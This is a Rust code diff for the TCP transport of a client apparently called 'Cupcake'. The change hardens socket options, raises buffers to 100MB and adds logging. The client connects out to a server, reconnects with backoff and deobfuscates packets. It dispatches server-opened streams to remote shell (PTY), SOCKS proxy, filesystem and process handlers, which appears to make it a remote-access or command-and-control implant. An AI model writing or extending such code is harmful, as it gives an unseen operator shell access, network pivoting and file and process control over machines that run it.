@@ -8,6 +8,7 @@ use crate::crypto;
 use crate::error::{ClientError, Result};
 use crate::transport::Transport;
 use async_trait::async_trait;
+use std::io::Write;
 use tokio::io::{AsyncReadExt as _, AsyncWriteExt};
 use tokio::net::TcpStream;
 use tokio::time::sleep;
@@ -63,53 +64,91 @@ impl Transport for TcpTransport {
             crate::utils::db_print(&format!("Connecting to {}...", addr));
             match TcpStream::connect(&addr).await {
                 Ok(stream) => {
-                    crate::utils::db_print("[Cupcake] TCP connected.");
-                    
-                    let mut yamux_config = Config::default();
-                    yamux_config.set_receive_window(1024 * 1024); 
-                    yamux_config.set_window_update_mode(WindowUpdateMode::OnRead);
-                    
-                    let compat_stream = stream.compat();
-                    let mut connection = Connection::new(compat_stream, yamux_config, Mode::Client);
-                    let mut control = connection.control();
-
-                    // 🛠 全功能多路复用调度器
-                    tokio::spawn(async move {
-                        crate::utils::db_print("[Yamux] Connection driver started.");
-                        loop {
-                            match connection.next_stream().await {
-                                Ok(Some(stream)) => {
-                                    crate::utils::db_print("[Yamux] New stream incoming.");
-                                    tokio::spawn(async move {
-                                        use futures_util::AsyncReadExt as _; // 🚀 Fix: Use futures-native traits for yamux::Stream
-                                        let mut stream = stream;
-                                        let mut type_buf = [0u8; 1];
-                                        if let Err(_) = stream.read_exact(&mut type_buf).await { return; }
-                                        
-                                        match type_buf[0] {
-                                            0x01 => { crate::pty::handle_stream(stream).await; }
-                                            0x02 => { crate::socks::handle_stream(stream).await; }
-                                            0x03 => { crate::fs::handle_stream(stream).await; }
-                                            0x04 => { crate::process::handle_stream(stream).await; }
-                                            _ => { crate::utils::db_print(&format!("[Yamux] Unknown type: 0x{:02X}", type_buf[0])); }
-                                        }
-                                    });
-                                }
-                                Ok(None) => break,
-                                Err(_) => break,
+                    // 🛡️ [Hardening] Configure low-level socket options
+                    if let Ok(std_stream) = stream.into_std() {
+                        let socket = socket2::Socket::from(std_stream);
+                        let _ = socket.set_keepalive(true);
+                        let _ = socket.set_tcp_nodelay(true);
+                        let _ = socket.set_linger(Some(std::time::Duration::from_secs(2)));
+                        
+                        // Re-wrap into tokio stream
+                        let stream = match TcpStream::from_std(socket.into()) {
+                            Ok(s) => s,
+                            Err(_) => {
+                                crate::utils::db_print("[Cupcake] Failed to re-wrap TCP stream");
+                                continue;
                             }
-                        }
-                    });
-
-                    let control_stream = match tokio::time::timeout(std::time::Duration::from_secs(10), control.open_stream()).await {
-                        Ok(Ok(s)) => s,
-                        _ => return Err(ClientError::ConnectionError("Yamux control failed".into())),
-                    };
+                        };
+                        crate::utils::db_print("[Cupcake] TCP hardened socket ready.");
                     
-                    crate::utils::db_print("[Cupcake] Control established.");
-                    self.control_stream = Some(control_stream.compat());
-                    self.backoff.reset();
-                    return Ok(());
+                        let mut yamux_config = Config::default();
+                        // 🚀 增加最大缓冲区大小以支持大型迁移载荷 (3.4MB+)
+                        yamux_config.set_max_buffer_size(100 * 1024 * 1024); // 100MB
+                        yamux_config.set_receive_window(100 * 1024 * 1024); // 100MB
+                        yamux_config.set_window_update_mode(WindowUpdateMode::OnRead);
+                        
+                        let compat_stream = stream.compat();
+                        let mut connection = Connection::new(compat_stream, yamux_config, Mode::Client);
+                        let mut control = connection.control();
+
+                        // 🛠 全功能多路复用调度器
+                        tokio::spawn(async move {
+                            crate::utils::db_print("[Yamux] Connection driver started.");
+                            loop {
+                                match connection.next_stream().await {
+                                    Ok(Some(stream)) => {
+                                        let stream_id = stream.id();
+                                        crate::utils::db_print(&format!("[Yamux] New stream incoming. ID: {}", stream_id));
+                                        tokio::spawn(async move {
+                                            use futures_util::AsyncReadExt as _; 
+                                            let mut stream = stream;
+                                            let mut type_buf = [0u8; 1];
+                                            if let Err(e) = stream.read_exact(&mut type_buf).await { 
+                                                crate::utils::db_print(&format!("[Yamux] Failed to read stream type for ID {}: {}", stream_id, e));
+                                                return; 
+                                            }
+                                            
+                                            crate::utils::db_print(&format!("[Yamux] Stream {} Type: 0x{:02X}", stream_id, type_buf[0]));
+                                            match type_buf[0] {
+                                                0x01 => { 
+                                                    crate::utils::db_print(&format!("[Yamux] Routing to PTY handler (Stream {})", stream_id));
+                                                    let _ = std::io::stdout().flush();
+                                                    crate::pty::handle_stream(stream).await; 
+                                                    crate::utils::db_print(&format!("[Yamux] PTY handler returned (Stream {})", stream_id));
+                                                }
+                                                0x02 => { crate::socks::handle_stream(stream).await; }
+                                                0x03 => { crate::fs::handle_stream(stream).await; }
+                                                0x04 => { crate::process::handle_stream(stream).await; }
+                                                _ => { crate::utils::db_print(&format!("[Yamux] Unknown type: 0x{:02X}", type_buf[0])); }
+                                            }
+                                        });
+                                    }
+                                    Ok(None) => {
+                                        crate::utils::db_print("[Yamux] Connection driver reached EOF.");
+                                        break;
+                                    }
+                                    Err(e) => {
+                                        crate::utils::db_print(&format!("[Yamux] Connection driver error: {}", e));
+                                        break;
+                                    }
+                                }
+                            }
+                        });
+
+                        let control_stream = match tokio::time::timeout(std::time::Duration::from_secs(10), control.open_stream()).await {
+                            Ok(Ok(s)) => s,
+                            _ => return Err(ClientError::ConnectionError("Yamux control failed".into())),
+                        };
+                        
+                        crate::utils::db_print("[Cupcake] Control established.");
+                        self.control_stream = Some(control_stream.compat());
+                        self.backoff.reset();
+                        return Ok(());
+                    } else {
+                        crate::utils::db_print("[Cupcake] Socket hardening failed, retrying...");
+                        let delay = self.backoff.next_delay();
+                        sleep(delay).await;
+                    }
                 }
                 Err(e) => {
                     let delay = self.backoff.next_delay();
@@ -137,7 +176,7 @@ impl Transport for TcpTransport {
             Ok(l) => l as usize,
             Err(e) => return Err(ClientError::ConnectionError(e.to_string())),
         };
-        if len > 10 * 1024 * 1024 { return Err(ClientError::ConnectionError("Too big".into())); }
+        if len > 100 * 1024 * 1024 { return Err(ClientError::ConnectionError("Too big".into())); }
         let mut buffer = vec![0u8; len];
         stream.read_exact(&mut buffer).await.map_err(|e| ClientError::ConnectionError(e.to_string()))?;
         let deobfuscated = crypto::deobfuscate_packet(buffer);
